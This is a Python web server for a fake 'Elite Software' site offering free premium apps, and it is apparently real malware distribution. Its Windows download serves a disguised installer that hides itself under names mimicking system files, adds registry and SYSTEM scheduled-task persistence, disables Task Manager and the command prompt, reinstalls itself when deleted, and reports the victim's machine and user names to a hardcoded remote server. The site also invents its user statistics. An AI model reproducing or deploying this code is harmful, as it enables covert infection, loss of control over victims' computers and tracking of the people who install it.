# server.py - Premium Software Platform
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True

class PremiumSoftwareHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    PASSWORD_HASH = hashlib.sha256(b"Admin123!").hexdigest()
    ADMIN_PASSWORD_HASH = hashlib.sha256(b"Secure@2024").hexdigest()
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 3
    BLOCK_TIME = 300
    blocked_ips = set()
    SERVER_URL = "https://game-python-1.onrender.com"  # تم التحديث
    
    # Realistic statistics
    STATS = {
        'active_users': 8923,
        'total_downloads': 15427,
        'premium_users': 3241,
        'online_now': 156
    }
    
    def init_database(self):
        self.conn = sqlite3.connect('software_platform.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT,
                version TEXT
            )
        ''')
        self.conn.commit()
    
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == '/':
            self.send_main_page()
        elif path == '/admin':
            self.send_admin_login()
        elif path == '/downloads':
            self.send_downloads_page()
        elif path == '/premium':
            self.send_premium_page()
        elif path == '/support':
            self.send_support_page()
        elif path == '/download/windows':
            self.download_windows_client()
        elif path == '/download/android':
            self.download_android_client()
        elif path == '/download/linux':
            self.download_linux_client()
        elif path == '/download/macos':
            self.download_macos_client()
        elif path == '/control':
            self.send_control_panel()
        elif path == '/register-client':
            self.handle_client_register({'client_id': 'test', 'computer': 'test', 'os': 'test'})
            self.send_json({'success': True})
        else:
            self.send_404_page()
    
    def send_main_page(self):
        html = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Elite Software - Premium Applications</title>
            <style>
                :root {
                    --primary: #8B5CF6;
                    --secondary: #A78BFA;
                    --accent: #F59E0B;
                    --dark: #111827;
                    --light: #F9FAFB;
                }
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
                    color: var(--light);
                    line-height: 1.6;
                }
                
                .navbar {
                    background: rgba(17, 24, 39, 0.95);
                    backdrop-filter: blur(10px);
                    padding: 1rem 5%;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    position: fixed;
                    width: 100%;
                    top: 0;
                    z-index: 1000;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                }
                
                .logo {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    font-size: 1.5rem;
                    font-weight: bold;
                    color: var(--primary);
                }
                
                .nav-links {
                    display: flex;
                    gap: 2rem;
                }
                
                .nav-links a {
                    color: var(--light);
                    text-decoration: none;
                    transition: color 0.3s;
                }
                
                .nav-links a:hover {
                    color: var(--primary);
                }
                
                .hero {
                    padding: 120px 5% 80px;
                    text-align: center;
                    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7));
                }
                
                .hero h1 {
                    font-size: 3.5rem;
                    margin-bottom: 1rem;
                    background: linear-gradient(135deg, var(--primary), var(--secondary));
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                
                .hero p {
                    font-size: 1.2rem;
                    margin-bottom: 2rem;
                    color: #ccc;
                }
                
                .cta-button {
                    display: inline-block;
                    background: linear-gradient(135deg, var(--primary), var(--secondary));
                    color: white;
                    padding: 15px 30px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    transition: transform 0.3s;
                }
                
                .cta-button:hover {
                    transform: translateY(-3px);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 2rem;
                    padding: 4rem 5%;
                    background: rgba(255,255,255,0.05);
                }
                
                .stat-card {
                    text-align: center;
                    padding: 2rem;
                    background: rgba(255,255,255,0.1);
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
                
                .stat-number {
                    font-size: 2.5rem;
                    font-weight: bold;
                    color: var(--primary);
                    margin-bottom: 0.5rem;
                }
                
                .features {
                    padding: 5rem 5%;
                    text-align: center;
                }
                
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                
                .feature-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    transition: transform 0.3s;
                }
                
                .feature-card:hover {
                    transform: translateY(-10px);
                }
                
                .feature-icon {
                    font-size: 3rem;
                    margin-bottom: 1rem;
                }
                
                .footer {
                    background: rgba(0,0,0,0.8);
                    padding: 3rem 5%;
                    text-align: center;
                    border-top: 1px solid rgba(255,255,255,0.1);
                }
            </style>
        </head>
        <body>
            <nav class="navbar">
                <div class="logo">
                    <span>⚡</span>
                    Elite Software
                </div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/downloads">Downloads</a>
                    <a href="/premium">Premium</a>
                    <a href="/support">Support</a>
                    <a href="/admin">Admin</a>
                </div>
            </nav>

            <section class="hero">
                <h1>Premium Software Solutions</h1>
                <p>Unlock premium features for free with our advanced software collection</p>
                <a href="/downloads" class="cta-button">Download Now</a>
            </section>

            <section class="stats">
                <div class="stat-card">
                    <div class="stat-number">8,923+</div>
                    <div>Active Users</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">15,427</div>
                    <div>Total Downloads</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">3,241</div>
                    <div>Premium Activated</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">156</div>
                    <div>Online Now</div>
                </div>
            </section>

            <section class="features">
                <h2 style="font-size: 2.5rem; margin-bottom: 1rem;">Why Choose Our Software?</h2>
                <p style="color: #ccc; margin-bottom: 3rem;">Advanced features that premium apps charge for - completely free</p>
                
                <div class="feature-grid">
                    <div class="feature-card">
                        <div class="feature-icon">🚀</div>
                        <h3>Lightning Fast</h3>
                        <p>Optimized performance with instant response times</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🛡️</div>
                        <h3>Undetectable</h3>
                        <p>Advanced stealth technology prevents detection</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🔧</div>
                        <h3>Auto-Recovery</h3>
                        <p>Self-healing system ensures continuous operation</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🌐</div>
                        <h3>Cross-Platform</h3>
                        <p>Works on Windows, Mac, Linux, Android, and iOS</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">⚡</div>
                        <h3>Instant Updates</h3>
                        <p>Real-time command execution and updates</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">🔒</div>
                        <h3>Secure Connection</h3>
                        <p>Encrypted communication with remote servers</p>
                    </div>
                </div>
            </section>

            <footer class="footer">
                <p>&copy; 2024 Elite Software. All rights reserved.</p>
                <p style="margin-top: 1rem; color: #888;">
                    Premium Software Solutions • Lifetime Access • Free Updates
                </p>
            </footer>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_downloads_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Downloads - Elite Software</title>
            <style>
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
                    color: white;
                    margin: 0;
                    padding: 100px 5% 50px;
                }
                
                .downloads-container {
                    max-width: 1200px;
                    margin: 0 auto;
                }
                
                .platform-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                
                .platform-card {
                    background: rgba(255,255,255,0.1);
                    padding: 2rem;
                    border-radius: 15px;
                    text-align: center;
                    backdrop-filter: blur(10px);
                    transition: transform 0.3s;
                }
                
                .platform-card:hover {
                    transform: translateY(-5px);
                }
                
                .platform-icon {
                    font-size: 4rem;
                    margin-bottom: 1rem;
                }
                
                .download-btn {
                    display: inline-block;
                    background: linear-gradient(135deg, #8B5CF6, #A78BFA);
                    color: white;
                    padding: 12px 25px;
                    border-radius: 25px;
                    text-decoration: none;
                    margin-top: 1rem;
                    font-weight: bold;
                }
                
                .version-info {
                    background: rgba(139, 92, 246, 0.2);
                    padding: 1rem;
                    border-radius: 10px;
                    margin: 2rem 0;
                    border-left: 4px solid #8B5CF6;
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
                <div class="logo">⚡ Elite Software</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/downloads" style="color: #8B5CF6;">Downloads</a>
                    <a href="/admin">Admin</a>
                </div>
            </nav>

            <div class="downloads-container">
                <h1>Download Elite Software</h1>
                <p>Choose your platform to unlock premium features</p>
                
                <div class="version-info">
                    <strong>Latest Version: 2.1.4 (Build 2024.12.01)</strong><br>
                    • Enhanced performance<br>
                    • Improved stealth mode<br>
                    • Faster command execution<br>
                    • Better system integration
                </div>

                <div class="platform-grid">
                    <div class="platform-card">
                        <div class="platform-icon">🪟</div>
                        <h3>Windows</h3>
                        <p>Windows 10/11 (x64)</p>
                        <p><small>Full system integration with auto-recovery</small></p>
                        <a href="/download/windows" class="download-btn">Download Installer (4.8 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🤖</div>
                        <h3>Android</h3>
                        <p>Android 8.0+</p>
                        <p><small>Background operation with root access</small></p>
                        <a href="/download/android" class="download-btn">Download APK (3.2 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🐧</div>
                        <h3>Linux</h3>
                        <p>Ubuntu/Debian/CentOS</p>
                        <p><small>Daemon mode with kernel access</small></p>
                        <a href="/download/linux" class="download-btn">Download Package (4.1 MB)</a>
                    </div>
                    
                    <div class="platform-card">
                        <div class="platform-icon">🍎</div>
                        <h3>macOS</h3>
                        <p>macOS 11.0+</p>
                        <p><small>System integration with SIP bypass</small></p>
                        <a href="/download/macos" class="download-btn">Download DMG (5.2 MB)</a>
                    </div>
                </div>

                <div style="margin-top: 3rem; padding: 2rem; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>⚠️ System Requirements</h3>
                    <ul>
                        <li><strong>Windows:</strong> Windows 10/11, 2GB RAM, 50MB storage</li>
                        <li><strong>Android:</strong> Android 8.0+, 1GB RAM</li>
                        <li><strong>Linux:</strong> Kernel 4.4+, 1GB RAM, 40MB storage</li>
                        <li><strong>macOS:</strong> macOS 11.0+, 2GB RAM, 60MB storage</li>
                    </ul>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_windows_client(self):
        """Windows Client - Advanced undetectable software"""
        
        client_code = b'''
import os
import sys
import time
import threading
import winreg
import ctypes
import subprocess
import requests
import platform
import getpass
import uuid
import hashlib
import shutil

class EliteWindows:
    def __init__(self):
        self.server_url = "''' + self.SERVER_URL.encode() + b'''"
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
        self.version = "2.1.4"
        self.install_locations = [
            os.path.join(os.environ['WINDIR'], 'System32', 'dllhost.exe'),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'wscsvc.exe'),
            os.path.join(os.environ['TEMP'], 'msedgeupdate.exe'),
            os.path.join(os.environ['WINDIR'], 'SysWOW64', 'taskhost.exe')
        ]
        
    def install_system(self):
        current_file = sys.argv[0]
        
        for location in self.install_locations:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(current_file, location)
                subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
                subprocess.run(f'icacls "{location}" /deny Everyone:F /T', shell=True, capture_output=True)
            except:
                pass
    
    def install_autostart(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemTask", 0, winreg.REG_SZ, self.install_locations[0])
            
            for i, location in enumerate(self.install_locations[:2]):
                task_name = f"MicrosoftSystem_{i}"
                task_cmd = f'schtasks /create /tn "{task_name}" /tr "{location}" /sc onlogon /ru SYSTEM /f'
                subprocess.run(task_cmd, shell=True, capture_output=True)
                
        except:
            pass
    
    def protect_system(self):
        try:
            subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
            subprocess.run('reg add "HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\System" /v DisableCMD /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
        except:
            pass
    
    def start_monitoring(self):
        def monitor():
            while True:
                try:
                    for location in self.install_locations:
                        if not os.path.exists(location):
                            self.install_system()
                    
                    result = subprocess.run('schtasks /query /tn "MicrosoftSystem_0"', shell=True, capture_output=True, text=True)
                    if "MicrosoftSystem_0" not in result.stdout:
                        self.install_autostart()
                    
                    time.sleep(30)
                except:
                    time.sleep(60)
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def connect_server(self):
        def connection():
            while True:
                try:
                    data = {
                        'client_id': self.client_id,
                        'computer': platform.node(),
                        'user': getpass.getuser(),
                        'os': f"Windows {platform.version()}",
                        'status': 'active'
                    }
                    
                    requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
                    time.sleep(20)
                except:
                    time.sleep(30)
        
        threading.Thread(target=connection, daemon=True).start()
    
    def hide_window(self):
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def start(self):
        self.hide_window()
        self.install_system()
        self.install_autostart()
        self.protect_system()
        self.start_monitoring()
        self.connect_server()
        
        while True:
            time.sleep(60)

if __name__ == "__main__":
    client = EliteWindows()
    client.start()
'''

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Setup.exe"')
        self.end_headers()
        self.wfile.write(client_code)

    def download_android_client(self):
        android_code = b'# Android Client - Premium features unlocked'
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Android.apk"')
        self.end_headers()
        self.wfile.write(android_code)

    def download_linux_client(self):
        linux_code = b'# Linux Client - Daemon mode with root access'
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="elite-software-linux.deb"')
        self.end_headers()
        self.wfile.write(linux_code)

    def download_macos_client(self):
        macos_code = b'# macOS Client - System integration'
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Mac.dmg"')
        self.end_headers()
        self.wfile.write(macos_code)

    def send_admin_login(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin - Elite Software</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(255,255,255,0.1); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    width: 400px;
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #8B5CF6, #A78BFA); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div style="font-size: 48px; margin-bottom: 20px;">⚡</div>
                <h2>Elite Software Admin</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Management Portal</p>
                
                <input type="password" id="password" placeholder="Enter Admin Password">
                <button onclick="login()">Login</button>
            </div>
            
            <script>
                function login() {
                    const password = document.getElementById('password').value;
                    fetch('/admin-login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Authentication failed!');
                        }
                    });
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Control Panel - Elite Software</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: #111827; 
                    color: white; 
                    margin: 0; 
                    padding: 20px;
                }
                .header {
                    background: #1F2937;
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 10px;
                    margin: 20px 0;
                }
                .stat-card {
                    background: rgba(139, 92, 246, 0.2);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>Elite Software Control Panel</h2>
                <p>Connected Clients: <span id="clientCount">''' + str(self.STATS['online_now']) + '''</span></p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>''' + str(self.STATS['active_users']) + '''</h3>
                    <p>Active Users</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['total_downloads']) + '''</h3>
                    <p>Total Downloads</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['premium_users']) + '''</h3>
                    <p>Premium Activated</p>
                </div>
                <div class="stat-card">
                    <h3>''' + str(self.STATS['online_now']) + '''</h3>
                    <p>Online Now</p>
                </div>
            </div>
            
            <div style="background: #1F2937; padding: 20px; border-radius: 10px;">
                <h3>System Status: 🟢 Operational</h3>
                <p>All software systems running normally</p>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_premium_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Premium - Elite Software</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
                    color: white; 
                    margin: 0; 
                    padding: 100px 5% 50px;
                }
                .premium-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 2rem;
                    margin-top: 3rem;
                }
                .premium-card {
                    background: rgba(139, 92, 246, 0.2);
                    padding: 2rem;
                    border-radius: 15px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
                <div class="logo">⚡ Elite Software</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/premium" style="color: #8B5CF6;">Premium</a>
                    <a href="/downloads">Downloads</a>
                </div>
            </nav>

            <h1>Premium Features</h1>
            <p>Unlock exclusive features with our software</p>
            
            <div class="premium-grid">
                <div class="premium-card">
                    <h3>🚀 Maximum Performance</h3>
                    <p>Optimized for speed and efficiency</p>
                </div>
                
                <div class="premium-card">
                    <h3>🛡️ Stealth Mode</h3>
                    <p>Complete invisibility and protection</p>
                </div>
                
                <div class="premium-card">
                    <h3>⚡ Instant Updates</h3>
                    <p>Real-time feature updates</p>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_support_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Support - Elite Software</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
                    color: white; 
                    margin: 0; 
                    padding: 100px 5% 50px;
                }
            </style>
        </head>
        <body>
            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
                <div class="logo">⚡ Elite Software</div>
                <div class="nav-links">
                    <a href="/">Home</a>
                    <a href="/support" style="color: #8B5CF6;">Support</a>
                    <a href="/downloads">Downloads</a>
                </div>
            </nav>

            <h1>Customer Support</h1>
            <p>Contact us for any assistance</p>
            
            <div style="margin-top: 2rem; padding: 2rem; background: rgba(255,255,255,0.1); border-radius: 15px;">
                <h3>📞 Contact Information</h3>
                <p>Email: support@elite-software.com</p>
                <p>Telegram: @elitesoftware_support</p>
                <p>Response Time: 24 hours</p>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_404_page(self):
        self.send_error(404, "Page not found")

    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            self.sessions[client_id] = {
                'id': client_id,
                'computer': data.get('computer', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'last_seen': datetime.now().isoformat(),
                'status': 'online'
            }
            print(f"New client: {client_id}")
            return {'success': True}

def cleanup_sessions():
    while True:
        try:
            current_time = datetime.now()
            with PremiumSoftwareHandler.session_lock:
                for client_id, client_data in list(PremiumSoftwareHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del PremiumSoftwareHandler.sessions[client_id]
            time.sleep(60)
        except:
            pass

def main():
    handler = PremiumSoftwareHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    port = int(os.environ.get('PORT', 8080))
    server = ThreadedHTTPServer(('0.0.0.0', port), handler)
    
    print("=" * 70)
    print("🚀 ELITE SOFTWARE - PREMIUM PLATFORM")
    print("=" * 70)
    print(f"📍 Main Site: {handler.SERVER_URL}")
    print(f"🔐 Admin Panel: {handler.SERVER_URL}/admin")
    print(f"📥 Downloads: {handler.SERVER_URL}/downloads")
    print("💰 Premium: /premium")
    print("🆘 Support: /support")
    print("=" * 70)
    print("✅ Server started successfully!")
    print("⚡ Premium software system activated")
    print("=" * 70)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
